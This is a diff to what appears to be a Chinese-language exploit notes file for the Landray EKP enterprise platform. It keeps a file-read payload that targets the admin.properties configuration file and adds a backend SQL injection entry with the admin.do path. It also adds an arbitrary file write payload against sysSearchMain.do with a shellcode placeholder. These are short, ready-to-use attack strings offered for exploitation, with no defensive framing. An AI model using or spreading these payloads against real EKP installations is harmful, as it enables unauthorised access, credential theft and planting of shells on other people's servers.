@@ -40,5 +40,10 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 
 ![图片](https://user-images.githubusercontent.com/118274389/223748827-8fd0d2b2-6ca3-4083-92d2-6a815e25fa21.png)
 
-   
+0x03-EKP后台SQL注入
 
+后台地址admin.do
+   
+0x04-任意文件写入漏洞
+
+var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=[shellcode]
